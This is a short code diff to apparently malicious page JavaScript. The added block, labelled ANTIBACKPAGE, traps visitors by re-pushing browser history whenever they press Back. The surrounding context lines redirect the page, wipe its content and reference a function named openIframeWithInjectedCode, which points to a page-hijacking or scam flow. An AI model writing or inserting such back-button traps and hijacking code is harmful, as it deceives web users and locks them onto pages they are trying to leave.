@@ -20,7 +20,12 @@
         window.location.href = adrestopenwindow;
         console.log(domena);
     }
-    
+/////////////////////////////////////////////////ANTIBACKPAGE/////////////////////////////////////////////////
+history.pushState(null, null, document.URL);
+window.addEventListener('popstate', function () {
+    history.pushState(null, null, document.URL);
+});
+/////////////////////////////////////////////////ANTIBACKPAGE/////////////////////////////////////////////////
     document.getElementsByTagName("html")[0].innerHTML = "";
     document.body.style.backgroundColor = "white";
     function openIframeWithInjectedCode() {
